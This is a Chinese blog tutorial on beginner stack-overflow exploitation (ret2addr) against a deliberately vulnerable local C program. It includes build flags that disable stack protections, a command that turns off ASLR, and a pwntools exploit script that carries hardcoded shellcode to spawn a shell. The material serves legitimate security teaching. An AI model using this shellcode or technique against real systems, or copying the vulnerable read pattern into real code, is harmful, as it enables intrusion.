---
title:  Pwn 入门（ret2addr)
permalink: pwn-ret2addr
date: 2019-09-15 11:20:45
tags: 
 - blog
 - Pwn
 - 网安
categories:
 - 网安
 - Note
---

最简单的 pwn 就是使用栈溢出返回到一个地址去执行shellcode，虽然见不到这种攻击方法，但是，对栈结构的理解还是很有帮助的。

<!-- more -->

ret2addr（return-to-address，**返回到确定地址执行**的攻击方法）

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
```

没有栈不可执行（NX），也没有地址随机化（ASLR）。这时候就直接使用地址覆盖就好。

## 0. 准备一下

首先要创建一个文件，`vuln.c`

```c
# include <stdio.h>

void func() {
    char buf[0x50];
    read(0, buf, 0x100);
    write(1, buf, 0x100);
}

int main() {
    func();
    return 0;
}
```

安装 32 位编译环境

```bash
apt-get install gcc-multilib g++-multilib
```

编译并关闭地址随机化

```bash
# 编译命令 
gcc -m32 vuln.c -o vuln -fno-stack-protector -z execstack  -no-pie

# 关闭地址随机化功能
echo 0 > /proc/sys/kernel/randomize_va_space
```


## 1. 确定溢出位置

- 先在IDA里估计下缓存区大小，然后使用 `pattern create length`生成一段随机不重复的字符串。
- 然后在 gdb 中 r指令 运行程序，，由于栈溢出，导致原本的函数的返回地址无法执行。
- 使用 pattern offset addr 确定程序的返回地址，也就是应该输入的无效字符串的长度。

## 2. 确定返回地址

- 打开 core 转储功能 `ulimit -c unlimited`。
- 运行程序，输入 上面获得的长度的无效字符串 + 4个任意字符（ESP）+ 4个任意字符（EIP）。此时程序会报错，然后把信息转储至 core 文件。
- 用 `gdb 程序名称 core`打开 core 文件。
- 此时ESP指向了所希望的 shellcode 的位置，也就是我们的自定义代码的位置。
- 此时EIP应该填充为 shellcode 的地址，即此时ESP的值。

## 3. 编写利用脚本

```python
from pwn import *

# context.log_level = 'debug'

p = process("./vuln")

payload = b'a' * 92

payload += p32(0xffffd570)
payload += b"\xeb\x11\x5e\x31\xc9\xb1\x32\x80"
payload += b"\x6c\x0e\xff\x01\x80\xe9\x01\x75"
payload += b"\xf6\xeb\x05\xe8\xea\xff\xff\xff"
payload += b"\x32\xc1\x51\x69\x30\x30\x74\x69"
payload += b"\x69\x30\x63\x6a\x6f\x8a\xe4\x51"
payload += b"\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

p.send(payload)
p.interactive()#返回交互式界面
```

## 4. pwn

- 执行`python vuln.py`（即第三步的脚本文件）